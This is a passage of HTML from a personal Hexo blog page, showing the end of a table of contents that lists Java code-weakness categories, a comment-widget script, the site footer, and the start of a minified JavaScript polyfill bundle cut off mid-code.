class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.1.27.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Sensitive-Field-Exposure"><span class="toc-number">1.1.28.</span> <span class="toc-text">Mass Assignment: Sensitive Field Exposure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.1.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.1.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.1.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.1.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Logger-Not-Declared-Static-Final"><span class="toc-number">1.1.29.</span> <span class="toc-text">Poor Logging Practice: Logger Not Declared Static Final</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.1.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.1.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.1.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.1.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Multiple-Loggers"><span class="toc-number">1.1.30.</span> <span class="toc-text">Poor Logging Practice: Multiple Loggers</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.1.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.1.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.1.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.1.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Logging-Practice-Use-of-a-System-Output-Stream"><span class="toc-number">1.1.31.</span> <span class="toc-text">Poor Logging Practice: Use of a System Output Stream</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.1.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.1.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.1.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.1.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Non-final-Public-Static-Field"><span class="toc-number">1.1.32.</span> <span class="toc-text">Poor Style: Non-final Public Static Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.1.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.1.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.1.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.1.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak"><span class="toc-number">1.1.33.</span> <span class="toc-text">System Information Leak</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.1.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.1.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.1.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.1.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis"><span class="toc-number">1.1.34.</span> <span class="toc-text">System Information Leak: Apache Axis</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.1.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.1.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.1.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.1.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Apache-Axis-2"><span class="toc-number">1.1.35.</span> <span class="toc-text">System Information Leak: Apache Axis 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.1.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.1.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.1.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.1.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-External"><span class="toc-number">1.1.36.</span> <span class="toc-text">System Information Leak: External</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.1.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.1.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.1.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.1.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-HTML-Comment-in-JSP"><span class="toc-number">1.1.37.</span> <span class="toc-text">System Information Leak: HTML Comment in JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.1.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.1.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.1.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.1.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Incomplete-Servlet-Error-Handling"><span class="toc-number">1.1.38.</span> <span class="toc-text">System Information Leak: Incomplete Servlet Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.1.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.1.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.1.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.1.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Internal"><span class="toc-number">1.1.39.</span> <span class="toc-text">System Information Leak: Internal</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.1.39.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.1.39.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.1.39.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.1.39.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Overly-Broad-SQL-Logging"><span class="toc-number">1.1.40.</span> <span class="toc-text">System Information Leak: Overly Broad SQL Logging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.1.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.1.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.1.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.1.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Spring-Boot-Actuators-Enabled"><span class="toc-number">1.1.41.</span> <span class="toc-text">System Information Leak: Spring Boot Actuators Enabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.1.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.1.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.1.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.1.41.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#System-Information-Leak-Struts-2"><span class="toc-number">1.1.42.</span> <span class="toc-text">System Information Leak: Struts 2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.1.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.1.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.1.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.1.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Trust-Boundary-Violation"><span class="toc-number">1.1.43.</span> <span class="toc-text">Trust Boundary Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.1.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.1.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.1.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.1.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Access-Violation"><span class="toc-number">1.1.44.</span> <span class="toc-text">Unsafe Mobile Code: Access Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.1.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.1.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.1.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.1.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Database-Access"><span class="toc-number">1.1.45.</span> <span class="toc-text">Unsafe Mobile Code: Database Access</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.1.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.1.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.1.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span class="toc-number">1.1.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Inner-Class"><span class="toc-number">1.1.46.</span> <span class="toc-text">Unsafe Mobile Code: Inner Class</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.1.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.1.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.1.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.1.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Public-finalize-Method"><span class="toc-number">1.1.47.</span> <span class="toc-text">Unsafe Mobile Code: Public finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.1.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.1.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.1.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.1.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Array-Declaration"><span class="toc-number">1.1.48.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Array Declaration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.1.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.1.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.1.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.1.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Mobile-Code-Unsafe-Public-Field"><span class="toc-number">1.1.49.</span> <span class="toc-text">Unsafe Mobile Code: Unsafe Public Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.1.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.1.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.1.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.1.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
                    </div>
                </span>
            </div>
        </div>
        
    </div>
</aside>



  
  
  

  

  
    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
      <div id="vcomment" class="comment"></div> 
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
   var notify = 'false' == true ? true : false;
   var verify = 'false' == true ? true : false;
    window.onload = function() {
        new Valine({
            el: '#vcomment',
            notify: notify,
            verify: verify,
            app_id: "cPIja8hEdmK0DO1mNhmKUtdb-gzGzoHsz",
            app_key: "rAG7JWw8FX9LqnHJj0NTvGdW",
            placeholder: "兄弟姐妹们，别默默地路过，吐槽下嘛～～～",
            avatar:"hide"
        });
    }
</script>

    </section>
  

  

  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2020 QingYu
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
  

        <!-- 不蒜子统计   
        <span id="busuanzi_container_site_pv" style='display:none'>
                本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span> 
        -->
        <span id="busuanzi_container_site_uv" >
                您是本博客第<span id="busuanzi_value_site_uv"></span>个访客，qingyu欢迎您的到来~
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


</footer>
    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(e){if(r[e])return r[e].exports;var i=r[e]={exports:{},id:e,loaded:!1};return t[e].call(i.exports,i,i.exports,n),i.loaded=!0,i.exports}var r={};n.m=t,n.c=r,n.p="./",n(0)}([function(t,n,r){r(195),t.exports=r(191)},function(t,n,r){var e=r(3),i=r(52),o=r(27),u=r(28),c=r(53),f="prototype",a=function(t,n,r){var s,l,h,v,p=t&a.F,d=t&a.G,y=t&a.S,g=t&a.P,b=t&a.B,m=d?e:y?e[n]||(e[n]={}):(e[n]||{})[f],x=d?i:i[n]||(i[n]={}),w=x[f]||(x[f]={});d&&(r=n);for(s in r)l=!p&&m&&void 0!==m[s],h=(l?m:r)[s],v=b&&l?c(h,e):g&&"function"==typeof h?c(Function.call,h):h,m&&u(m,s,h,t&a.U),x[s]!=h&&o(x,s,v),g&&w[s]!=h&&(w[s]=h)};e.core=i,a.F=1,a.G=2,a.S=4,a.P=8,a.B=16,a.W=32,a.U=64,a.R=128,t.exports=a},function(t,n,r){var e=r(6);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n,r){var e=r(126)("wks"),i=r(76),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(94),i=r(33);t.exports=function(t){return e(i(t))}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(167),o=r(50),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(18)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(22);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(20),i=r(58),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(40)("wks"),i=r(23),o=r(5).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n,r){var e=r(67),i=Math.min;t.exports=function(t){return t>0?i(e(t),9007199254740991):0}},function(t,n,r){var e=r(46);t.exports=function(t){return Object(e(t))}},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,r){var e=r(63),i=r(34);t.exports=Object.keys||function(t){return e(t,i)}},function(t,n,r){var e=r(21);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var r=0,e=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++r+e).toString(36))}},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n){var r=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=r)},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n,r){var e=r(11),i=r(66);t.exports=r(10)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(3),i=r(27),o=r(24),u=r(76)("src"),c="toString",f=Function[c],a=(""+f).split(c);r(52).inspectSource=function(t){return f.call(t)},(t.exports=function(t,n,r,c){var f="function"==typeof r;f&&(o(r,"name")||i(r,"name",n)),t[n]!==r&&(f&&(o(r,u)||i(r,u,t[n]?""+t[n]:a.join(String(n)))),t===e?t[n]=r:c?t[n]?t[n]=r:i(t,n,r):(delete t[n],i(t,n,r)))})(Function.prototype,c,function(){return"function"==typeof this&&this[u]||f.call(this)})},function(t,n,r){var e=r(1),i=r(4),o=r(46),u=function(t,n,r,e){var i=String(o(t)),u="<"+n;return""!==r&&(u+=" "+r+'="'+String(e).replace(/"/g,"&quot;")+'"'),u+">"+i+"</"+n+">"};t.exports=function(t,n){var r={};r[t]=n(u),e(e.P+e.F*i(function(){var n=""[t]('"');return n!==n.toLowerCase()||n.split('"').length>3}),"String",r)}},function(t,n,r){var e=r(115),i=r(46);t.exports=function(t){return e(i(t))}},function(t,n,r){var e=r(116),i=r(66),o=r(30),u=r(50),c=r(24),f=r(167),a=Object.getOwnPropertyDescriptor;n.f=r(10)?a:function(t,n){if(t=o(t),n=u(n,!0),f)try{return a(t,n)}catch(t){}if(c(t,n))return i(!e.f.call(t,n),t[n])}},function(t,n,r){var e=r(24),i=r(17),o=r(145)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=i(t),e(t,o)?t[o]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,r){var e=r(14).f,i=r(8),o=r(15)("toStringTag");t.exports=function(t,n,r){t&&!i(t=r?t:t.prototype,o)&&e(t,o,{configurable:!0,value:n})}},function(t,n,r){var e=r(40)("keys"),i=r(23);t.exports=function(t){return e[t]||(e[t]=i(t))}},function(t,n,r){var e=r(5),i="__core-js_shared__",o=e[i]||(e[i]={});t.exports=function(t){return o[t]||(o[t]={})}},function(t,n){var r=Math.ceil,e=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?e:r)(t)}},function(t,n,r){var e=r(21);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(36),u=r(44),c=r(14).f;t.exports=function(t){var n=i.Symbol||(i.Symbol=o?{}:e.Symbol||{});"_"==t.charAt(0)||t in n||c(n,t,{value:u.f(t)})}},function(t,n,r){n.f=r(15)},function(t,n){var r={}.toString;t.exports=function(t){return r.call(t).slice(8,-1)}},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n,r){var e=r(4);t.exports=function(t,n){return!!t&&e(function(){n?t.call(null,function(){},1):t.call(null)})}},function(t,n,r){var e=r(53),i=r(115),o=r(17),u=r(16),c=r(203);t.exports=function(t,n){var r=1==t,f=2==t,a=3==t,s=4==t,l=6==t,h=5==t||l,v=n||c;return function(n,c,p){for(var d,y,g=o(n),b=i(g),m=e(c,p,3),x=u(b.length),w=0,S=r?v(n,x):f?v(n,0):void 0;x>w;w++)if((h||w in b)&&(d=b[w],y=m(d,w,g),t))if(r)S[w]=y;else if(y)switch(t){case 3:return!0;case 5:return d;case 6:return w;case 2:S.push(d)}else if(s)return!1;return l?-1:a||s?s:S}}},function(t,n,r){var e=r(1),i=r(52),o=r(4);t.exports=function(t,n){var r=(i.Object||{})[t]||Object[t],u={};u[t]=n(r),e(e.S+e.F*o(function(){r(1)}),"Object",u)}},function(t,n,r){var e=r(6);t.exports=function(t,n){if(!e(t))return t;var r,i;if(n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;if("function"==typeof(r=t.valueOf)&&!e(i=r.call(t)))return i;if(!n&&"function"==typeof(r=t.toString)&&!e(i=r.call(t)))return i;throw TypeError("Can't convert object to primitive value")}},function(t,n,r){var e=r(5),i=r(25),o=r(91),u=r(13),c="prototype",f=function(t,n,r){var 